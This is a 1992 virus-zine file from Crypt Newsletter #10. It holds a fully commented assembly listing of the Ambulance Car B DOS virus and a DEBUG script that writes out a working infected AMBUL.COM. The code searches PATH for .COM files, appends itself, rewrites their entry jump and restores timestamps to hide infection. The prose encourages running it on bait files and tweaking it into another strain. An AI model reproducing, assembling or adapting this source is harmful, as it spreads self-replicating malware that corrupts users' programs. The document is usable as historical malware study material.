;REDCROSS/AMBULANCE CAR VIRUS for Crypt Newsletter #10, edited by Urnst Kouch
;December 1992
;Originally supplied as a Sourcer disassembly in a Scandinavian virus mag
;published by "Youth Against McAfee (YAM)", this AMBULANCE specimen was 
;generated in its raw form by "Natas Kaupas." Hold that up to your mirror
;and it spells Satan. Whatever, "Natas/Satan" has also supplied us with the
;MINDLESS/FamR series of viruses for you trivia buffs. The Crypt Newsletter
;is obliged to him, wherever he is, for these interesting programs.
;
;In any case, while helpful, the original disassembly had diminished
;value, being completely uncommented. It did, however, assemble 
;under TASM into an actual working copy of the virus, which
;appears to be the AMBULANCE CAR B strain.
;
;
;Ambulance Car remains an interesting virus, packed with enough features
;so that it can still find its target files, .COM executables, wherever
;they might be lurking on a system.
;
;Principally, this revolves around the virus searching the path string set
;in the environment. If no path exists, the virus defaults to the
;current directory. In both cases, the virus may infect up to two files
;anywhere on the path per pass. Most times it will infect only one. 
;Sometimes it will not budge at all. 
;
;Once it's found a file, Ambulance checks it for the 0E9h byte at 
;the beginning. If it doesn't find it, the virus assumes the file is
;uninfected and immediately tries to complete the infection. If
;it does find the byte, it continues reading from there to confirm
;the viral sequence. If this is a coincidence and the complete sequence
;is not there, the virus will infect the file anyway.  
;
;Randomly, the virus will activate and run the Ambulance across the bottom
;of your screen after a round of infection.  Because of the path search
;Ambulance can easily find .COM executables on a sizeable disk at a time
;when there are less and less of these to be seen. Unfortunately, for a
;direct-action virus, the disk activity is noticeable with the caveats:
;on a fast machine, perhaps not; or in front of an average user, perhaps not.
;You never know how a user will react when dealing with viruses.
;
;You can easily experiment with this version on your machine by commenting
;out the path statement in your AUTOEXEC.BAT. This will restrict the
;virus to a test directory where it can be used to infect bait files
;until the Ambulance effect is seen.
;
;Ambulance Car is detected by "rules-based" anti-virus sentries like
;PCRx (reviewed in this issue), but keep in mind this type of
;protection is not flawless. Accidents can happen. Most current scanners 
;easily detect this variant of Ambulance, although
;some cannot disinfect files once they are parasitized.

data_1e           equ     0Ch
data_2e           equ     49h
data_3e           equ     6Ch
psp_envirn_seg    equ     2Ch
data_21e  equ     0C80h

virus             segment byte public
          assume  cs:virus, ds:virus


          org     100h

redcross          proc    far   ;main flow control procedure for Ambulance
                                ;Car virus
start:
          jmp     short virstart
data_5            dw      4890h          ; Data table 
data_7            dw      6C65h          ; Data table 
          db       6Ch, 6Fh, 20h, 2Dh, 20h

copyright   db      'Copyright S & S Enterprises, 198';whoah, how'd Solomon's
          db      '8'                                 ;stamp get in here? ;-]
          db       0Ah, 0Dh, 24h, 1Ah,0B4h, 09h
          db      0BAh, 03h, 01h,0CDh, 21h,0CDh
          db      20h
virstart:                     
          db      0E8h, 01h, 00h
          add     [bp-7Fh],bx
          out     dx,al                   ; port 0, channel 0
          add     ax,[bx+di]
          call    check_infect            ; do path search, infect file
          call    check_infect            ; ditto, sometimes, sometimes not
          call    sound_fury              ; do we do AMBULANCE effect? Check!
          lea     bx,[si+419h]            
          mov     di,100h
          mov     al,[bx]
          mov     [di],al
          mov     ax,[bx+1]
          mov     [di+1],ax
          jmp     di                      ; Register jump

exit:
          retn                            ; handoff to host

redcross              endp

;*****************************************************************************
;         SUBROUTINE
;*****************************************************************************

check_infect         proc    near         ; path search for Ambulance
          call    loadpath                ; Car
          mov     al,byte ptr data_19[si]
          or      al,al                    
          jz      exit                    ; No path/no files? Git!
          lea     bx,[si+40Fh]            
          inc     word ptr [bx]
          lea     dx,[si+428h]            ; load effective address
          mov     ax,3D02h
          int     21h                ; open found file by loadpath read/write
                                          ; with handle
          mov     word ptr ds:[417h][si],ax  ;ax contains handle
          mov     bx,word ptr ds:[417h][si]
          mov     cx,3
          lea     dx,[si+414h]            ; load address of buffer
          mov     ah,3Fh                  ; to read first three bytes into.
          int     21h                     ; Read the bytes . . .
                                          ; bx points to file handle.
                                          ;   
          mov     al,byte ptr ds:[414h][si]
          cmp     al,0E9h                 ; compare with 0E9h
          jne     infect        ; if not equal, assume virus not here - infect
          mov     dx,word ptr ds:[415h][si]  
          mov     bx,word ptr ds:[417h][si]
          add     dx,3
          xor     cx,cx                   ; zero register
          mov     ax,4200h
          int     21h                     ; point to beginning of file, again
                                          ; bx contains the handle
                                          
          mov     bx,word ptr ds:[417h][si]
          mov     cx,6
          lea     dx,[si+41Ch]            ; load effective address
          mov     ah,3Fh                  ; and read the first 6 bytes
          int     21h                     ; this time  
                                            
                                          ; ds:dx points to buffer
         mov     ax,data_13[si]
         mov     bx,data_14[si]
         mov     cx,data_15[si]
         cmp     ax,word ptr ds:[100h][si] ; compare with data copied above
         jne     infect                    ; jump if not equal to infect
         cmp     bx,data_5[si]
         jne     infect                    ; jump if not equal
         cmp     cx,data_7[si]
         je      close                   ; finally, if we get a match we know
infect:                                    ; we're here, so go to close up 
         mov     bx,word ptr ds:[417h][si]
         xor     cx,cx                   ; zero register
         xor     dx,dx                   ; zero register
         mov     ax,4202h
         int     21h                     ; reset pointer to end of file
                                         ; bx contains file handle
                                          
         sub     ax,3
         mov     word ptr ds:[412h][si],ax
         mov     bx,word ptr ds:[417h][si]
         mov     ax,5700h                ; bx points to name of file
         int     21h                     ; get file date and time
                                         ; time returns in cx, date in dx
                                          
         push    cx                      ; push these onto the stack
         push    dx                      ; we'll need 'em later
         mov     bx,word ptr ds:[417h][si]
         mov     cx,319h
         lea     dx,[si+100h]            
         mov     ah,40h                  ; write the virus to the end of
         int     21h                     ; the file, identified in bx
                                         ; cx contains virus length for write
                                         ; so do it, yes, append virus
         mov     bx,word ptr ds:[417h][si]
         mov     cx,3
         lea     dx,[si+414h]            ; load effective address
         mov     ah,40h                  ; 
         int     21h                     ; DOS Services  ah=function 40h
                                         ; write file  bx=file handle
                                         ; cx=bytes from ds:dx buffer
         mov     bx,word ptr ds:[417h][si]
         xor     cx,cx                   ; zero register
         xor     dx,dx                   ; zero register
         mov     ax,4200h
         int     21h                     ; reset the pointer to start of file
                                         ; identified in bx
                                         ; cx,dx=offset
         mov     bx,word ptr ds:[417h][si]
         mov     cx,3
         lea     dx,[si+411h]            ; load effective address
         mov     ah,40h                  ; and write the first three virus id
         int     21h                     ; and jump bytes to the file
                                         ; now, just about finished
                                         
         pop     dx                      ; retrieve date
         pop     cx                      ; and time from stack
         mov     bx,word ptr ds:[417h][si]
         mov     ax,5701h                ; restore file's date/time
         int     21h                     

close:
         mov     bx,word ptr ds:[417h][si]
         mov     ah,3Eh                  
         int     21h                     ; close file
                                         
         retn                            ; return to caller, maybe we'll 
check_infect      endp                   ; infect again, maybe not


;*****************************************************************************
;                               SUBROUTINE
;*****************************************************************************

loadpath            proc    near    ; this procedure checks for the
         mov     ax,ds:psp_envirn_seg ; existence of the ASCII path string in the 
         mov     es,ax              ; environment block of the program 
         push    ds                 ; segment prefix (in this case psp_envirn_seg) 
         mov     ax,40h             ; if it exists, Ambulance Car copies
         mov     ds,ax              ; the entire string into a buffer by using
         mov     bp,ds:data_3e      ; '/' and ';' as cues. The virus then
         pop     ds                 ; sets the DTA to a directory
         test    bp,3               ; found in the path and executes a simple 
         jz      loc_8              ; file search. If unproductive, it
         xor     bx,bx              ; recursively searches the path
loc_6:                              ; before defaulting to the current 
         mov     ax,es:[bx]         ; directory
         cmp     ax,4150h
         jne     loc_7                   
         cmp     word ptr es:[bx+2],4854h 
         je      loc_9                   
loc_7:
         inc     bx
         or      ax,ax                   
         jnz     loc_6                   ; jump if not zero
loc_8:
         lea     di,[si+428h]           
         jmp     short loc_14
loc_9:
         add     bx,5
loc_10:
         lea     di,[si+428h]          ; load effective address of buffer
loc_11:
         mov     al,es:[bx]
         inc     bx                   ; copy a byte from the path
         or      al,al                 
         jz      loc_13               ; jump if zero
         cmp     al,3Bh               ; found a divider? ';'
         je      loc_12               ; jump if equal, continue copying path
         mov     [di],al
         inc     di
         jmp     short loc_11         ; loop around, continue copying
loc_12:
         cmp     byte ptr es:[bx],0      
         je      loc_13                  
         shr     bp,1                    ; Shift w/zeros fill
         shr     bp,1                    ; Shift w/zeros fill
         test    bp,3
         jnz     loc_10                  ; Jump if not zero
loc_13:
         cmp     byte ptr [di-1],5Ch     ; compare with '\'
         je      loc_14                  ; jump if equal
         mov     byte ptr [di],5Ch       ; compare with '\'
         inc     di
loc_14:
         push    ds
         pop     es
         mov     data_16[si],di
         mov     ax,2E2Ah
         stosw                    ; copy portion of path, store ax to es:[di]
         mov     ax,4F43h
         stosw                           ; Store ax to es:[di]
         mov     ax,4Dh
         stosw                           ; Store ax to es:[di]
         push    es
         mov     ah,2Fh                  
         int     21h                     ; get current DTA
                                         ; move it into es:bx
         mov     ax,es
         mov     data_17[si],ax
         mov     data_18[si],bx
         pop     es
         lea     dx,[si+478h]            ; address of filemask
         mov     ah,1Ah
         int     21h                     ; set the DTA to first dir in path
                                         ; disk xfer area, ds:dx
         lea     dx,[si+428h]            ; load effective address
         xor     cx,cx                   ; zero register
         mov     ah,4Eh                  ; find first file
         int     21h                      
                                         
         jnc     loc_15                  ; jump if carry = 0
         xor     ax,ax                   
         mov     data_19[si],ax
         jmp     short loc_18
loc_15:
         push    ds
         mov     ax,40h
         mov     ds,ax
         ror     bp,1                    
         xor     bp,ds:data_3e
         pop     ds
         test    bp,7
         jz      loc_16                  ; Jump if zero
         mov     ah,4Fh                  
         int     21h                     
                                         ; find next file
         jnc     loc_15                  ; jump if carry = 0
loc_16:
         mov     di,data_16[si]
         lea     bx,[si+496h]            
loc_17:
         mov     al,[bx]
         inc     bx
         stosb                           ; Store al to es:[di]
         or      al,al                   
         jnz     loc_17                  ; Jump if not zero
loc_18:
         mov     bx,data_18[si]
         mov     ax,data_17[si]
         push    ds
         mov     ds,ax
         mov     ah,1Ah
         int     21h                     ; DOS Services  ah=function 1Ah
                                         ; set DTA(disk xfer area), ds:dx
         pop     ds
         retn                            ; return to check_infect
loadpath            endp


;*****************************************************************************
;                               SUBROUTINE
;*****************************************************************************

sound_fury            proc    near       ;sets up Ambulance Car effect, but
         push    es                      ; other than that, I have no idea
         mov     ax,word ptr ds:[40Fh][si]  ; subroutines and procs from
         and     ax,7                       ; here on down manage the
         cmp     ax,6                       ; Ambulance Car graphic and
         jne     loc_19                     ; siren effect
         mov     ax,40h
         mov     es,ax
         mov     ax,es:data_1e
         or      ax,ax                   
         jnz     loc_19                 ; <= comment this out and you'll
         inc     word ptr es:data_1e    ; get a corrupted version of the
         call    sub_5                  ; Car effect everytime the virus
loc_19:                                 ; executes. If you fiddle around 
         pop     es                     ; with it enough you'll eventually
         retn                           ; get the strain known as RedX-Any,
sound_fury            endp              ; for RedCross anytime.


;*****************************************************************************
;                               SUBROUTINE
;*****************************************************************************

sub_5            proc    near
         push    ds
         mov     di,0B800h
         mov     ax,40h
         mov     ds,ax
         mov     al,ds:data_2e
         cmp     al,7
         jne     loc_20                  
         mov     di,0B000h
loc_20:
         mov     es,di
         pop     ds
         mov     bp,0FFF0h
loc_21:
         mov     dx,0
         mov     cx,10h

locloop_22:
         call    sub_8
         inc     dx
         loop    locloop_22              ; Loop if cx > 0

         call    sub_7
         call    sub_9
         inc     bp
         cmp     bp,50h
         jne     loc_21                  ; Jump if not equal
         call    sub_6
         push    ds
         pop     es
         retn
sub_5            endp


;*****************************************************************************
;                               SUBROUTINE
;*****************************************************************************

sub_6            proc    near          ; cycles speaker on for siren
         in      al,61h                  ; port 61h, 8255 port B, read
         and     al,0FCh
         out     61h,al                  ; port 61h, 8255 B - spkr, etc
                                         ;  al = 0, disable parity
         retn
sub_6            endp


;*****************************************************************************
;                               SUBROUTINE
;*****************************************************************************

sub_7            proc    near            ; more speaker stuff
         mov     dx,7D0h
         test    bp,4
         jz      loc_23                  
         mov     dx,0BB8h
loc_23:
         in      al,61h                  ; port 61h, 8255 port B, read
         test    al,3
         jnz     loc_24                  
         or      al,3
         out     61h,al                  ; port 61h, 8255 B - spkr, etc
         mov     al,0B6h
         out     43h,al                  ; port 43h, 8253 wrt timr mode
loc_24:
         mov     ax,dx
         out     42h,al                  ; port 42h, 8253 timer 2 spkr
         mov     al,ah
         out     42h,al                  ; port 42h, 8253 timer 2 spkr
         retn
sub_7            endp


;*****************************************************************************
;                               SUBROUTINE
;*****************************************************************************

sub_8            proc    near
         push    cx
         push    dx
         lea     bx,[si+3BFh]            ; Load effective addr
         add     bx,dx
         add     dx,bp
         or      dx,dx                   ; Zero ?
         js      loc_27                  ; Jump if sign=1
         cmp     dx,50h
         jae     loc_27                  ; Jump if above or =
         mov     di,data_21e
         add     di,dx
         add     di,dx
         sub     dx,bp
         mov     cx,5

locloop_25:
         mov     ah,7
         mov     al,[bx]
         sub     al,7
         add     al,cl
         sub     al,dl
         cmp     cx,5
         jne     loc_26                  ; Jump if not equal
         mov     ah,0Fh
         test    bp,3
         jz      loc_26                  ; Jump if zero
         mov     al,20h                  ; ' '
loc_26:
         stosw                           ; Store ax to es:[di]
         add     bx,10h
         add     di,9Eh
         loop    locloop_25              ; Loop if cx > 0

loc_27:
         pop     dx
         pop     cx
         retn
sub_8            endp


;*****************************************************************************
;                               SUBROUTINE
;*****************************************************************************

sub_9            proc    near
         push    ds
         mov     ax,40h
         mov     ds,ax
         mov     ax,ds:data_3e
loc_29:
         cmp     ax,ds:data_3e
         je      loc_29                  ; Jump if equal
         pop     ds
         retn
sub_9            endp

         db       22h, 23h, 24h, 25h
         db       26h, 27h, 28h, 29h, 66h, 87h
         db       3Bh, 2Dh, 2Eh, 2Fh, 30h, 31h
         db       23h,0E0h,0E1h,0E2h,0E3h,0E4h
         db      0E5h
data_8           dw      0E7E6h                  ; Data table (indexed access)
         db      0E7h
data_9           dw      0EAE9h                  ; Data table (indexed access)
data_10          db      0EBh                    ; Data table (indexed access)
data_11          dw      3130h                   ; Data table (indexed access)
data_12          dw      2432h                   ; Data table (indexed access)
         db      0E0h,0E1h,0E2h
data_13          dw      0E8E3h                  ; Data table (indexed access)
data_14          dw      0EA2Ah                  ; Data table (indexed access)
data_15          dw      0E8E7h                  ; Data table (indexed access)
data_16          dw      2FE9h                   ; Data table (indexed access)
data_17          dw      6D30h                   ; Data table (indexed access)
data_18          dw      3332h                   ; Data table (indexed access)
data_19          dw      0E125h                  ; Data table (indexed access)
         db      0E2h,0E3h,0E4h,0E5h,0E7h,0E7h
         db      0E8h,0E9h,0EAh,0EBh,0ECh,0EDh
         db      0EEh,0EFh, 26h,0E6h,0E7h, 29h
         db       59h, 5Ah, 2Ch,0ECh,0EDh,0EEh
         db      0EFh,0F0h, 32h, 62h, 34h,0F4h
         db       09h, 00h,0E9h, 36h, 00h,0EBh
         db       2Eh, 90h, 05h, 00h,0EBh, 2Eh
         db       90h

virus            ends



         end     start

;;;;
N AMBUL.COM
E 0100 E9 CD 07 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0110 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0120 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0130 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0140 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0150 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0160 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0170 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0180 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0190 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 01A0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 01B0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 01C0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 01D0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 01E0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 01F0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0200 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0210 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0220 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0230 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0240 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0250 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0260 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0270 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0280 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0290 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 02A0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 02B0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 02C0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 02D0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 02E0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 02F0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0300 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0310 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0320 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0330 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0340 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0350 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0360 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0370 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0380 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0390 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 03A0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 03B0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 03C0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 03D0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 03E0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 03F0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0400 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0410 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0420 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0430 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0440 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0450 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0460 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0470 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0480 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0490 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 04A0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 04B0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 04C0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 04D0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 04E0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 04F0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0500 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0510 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0520 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0530 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0540 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0550 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0560 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0570 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0580 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0590 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 05A0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 05B0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 05C0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 05D0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 05E0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 05F0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0600 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0610 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0620 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0630 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0640 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0650 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0660 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0670 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0680 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0690 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 06A0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 06B0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 06C0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 06D0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 06E0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 06F0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0700 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0710 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0720 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0730 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0740 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0750 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0760 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0770 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0780 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0790 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 07A0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 07B0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 07C0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 07D0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 07E0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 07F0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0800 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0810 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0820 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0830 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0840 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0850 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0860 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0870 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0880 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0890 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 08A0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 08B0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 08C0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 08D0 E8 01 00 01 5E 81 EE 03 01 E8 1A 00 E8 17 00 E8 
E 08E0 D2 01 8D 9C 19 04 BF 00 01 8A 07 88 05 8B 47 01 
E 08F0 89 45 01 FF E7 C3 E8 DE 00 8A 84 28 04 0A C0 74 
E 0900 F4 8D 9C 0F 04 FF 07 8D 94 28 04 B8 02 3D CD 21 
E 0910 89 84 17 04 8B 9C 17 04 B9 03 00 8D 94 14 04 B4 
E 0920 3F CD 21 8A 84 14 04 3C E9 75 3F 8B 94 15 04 8B 
E 0930 9C 17 04 83 C2 03 33 C9 B8 00 42 CD 21 8B 9C 17 
E 0940 04 B9 06 00 8D 94 1C 04 B4 3F CD 21 8B 84 1C 04 
E 0950 8B 9C 1E 04 8B 8C 20 04 3B 84 00 01 75 0C 3B 9C 
E 0960 02 01 75 06 3B 8C 04 01 74 64 8B 9C 17 04 33 C9 
E 0970 33 D2 B8 02 42 CD 21 2D 03 00 89 84 12 04 8B 9C 
E 0980 17 04 B8 00 57 CD 21 51 52 8B 9C 17 04 B9 19 03 
E 0990 8D 94 00 01 B4 40 CD 21 8B 9C 17 04 B9 03 00 8D 
E 09A0 94 14 04 B4 40 CD 21 8B 9C 17 04 33 C9 33 D2 B8 
E 09B0 00 42 CD 21 8B 9C 17 04 B9 03 00 8D 94 11 04 B4 
E 09C0 40 CD 21 5A 59 8B 9C 17 04 B8 01 57 CD 21 8B 9C 
E 09D0 17 04 B4 3E CD 21 C3 A1 2C 00 8E C0 1E B8 40 00 
E 09E0 8E D8 8B 2E 6C 00 1F F7 C5 03 00 74 17 33 DB 26 
E 09F0 8B 07 3D 50 41 75 08 26 81 7F 02 54 48 74 0B 43 
E 0A00 0B C0 75 EB 8D BC 28 04 EB 32 83 C3 05 8D BC 28 
E 0A10 04 26 8A 07 43 0A C0 74 19 3C 3B 74 05 88 05 47 
E 0A20 EB EF 26 80 3F 00 74 0A D1 ED D1 ED F7 C5 03 00 
E 0A30 75 DB 80 7D FF 5C 74 04 C6 05 5C 47 1E 07 89 BC 
E 0A40 22 04 B8 2A 2E AB B8 43 4F AB B8 4D 00 AB 06 B4 
E 0A50 2F CD 21 8C C0 89 84 24 04 89 9C 26 04 07 8D 94 
E 0A60 78 04 B4 1A CD 21 8D 94 28 04 33 C9 B4 4E CD 21 
E 0A70 73 08 33 C0 89 84 28 04 EB 29 1E B8 40 00 8E D8 
E 0A80 D1 CD 33 2E 6C 00 1F F7 C5 07 00 74 06 B4 4F CD 
E 0A90 21 73 E7 8B BC 22 04 8D 9C 96 04 8A 07 43 AA 0A 
E 0AA0 C0 75 F8 8B 9C 26 04 8B 84 24 04 1E 8E D8 B4 1A 
E 0AB0 CD 21 1F C3 06 8B 84 0F 04 25 07 00 3D 06 00 75 
E 0AC0 15 B8 40 00 8E C0 26 A1 0C 00 0B C0 75 08 26 FF 
E 0AD0 06 0C 00 E8 02 00 07 C3 1E BF 00 B8 B8 40 00 8E 
E 0AE0 D8 A0 49 00 3C 07 75 03 BF 00 B0 8E C7 1F BD F0 
E 0AF0 FF BA 00 00 B9 10 00 E8 3F 00 42 E2 FA E8 16 00 
E 0B00 E8 7B 00 45 83 FD 50 75 E8 E8 03 00 1E 07 C3 E4 
E 0B10 61 24 FC E6 61 C3 BA D0 07 F7 C5 04 00 74 03 BA 
E 0B20 B8 0B E4 61 A8 03 75 08 0C 03 E6 61 B0 B6 E6 43 
E 0B30 8B C2 E6 42 8A C4 E6 42 C3 51 52 8D 9C BF 03 03 
E 0B40 DA 03 D5 0B D2 78 34 83 FA 50 73 2F BF 80 0C 03 
E 0B50 FA 03 FA 2B D5 B9 05 00 B4 07 8A 07 2C 07 02 C1 
E 0B60 2A C2 83 F9 05 75 0A B4 0F F7 C5 03 00 74 02 B0 
E 0B70 20 AB 83 C3 10 81 C7 9E 00 E2 DD 5A 59 C3 1E B8 
E 0B80 40 00 8E D8 A1 6C 00 3B 06 6C 00 74 FA 1F C3 22 
E 0B90 23 24 25 26 27 28 29 66 87 3B 2D 2E 2F 30 31 23 
E 0BA0 E0 E1 E2 E3 E4 E5 E6 E7 E7 E9 EA EB 30 31 32 24 
E 0BB0 E0 E1 E2 E3 E8 2A EA E7 E8 E9 2F 30 6D 32 33 25 
E 0BC0 E1 E2 E3 E4 E5 E7 E7 E8 E9 EA EB EC ED EE EF 26 
E 0BD0 E6 E7 29 59 5A 2C EC ED EE EF F0 32 62 34 F4 0B 
E 0BE0 00 E9 CD 07 CD 20 90 05 00 CD 20 90 
RCX
0AEC
W
Q
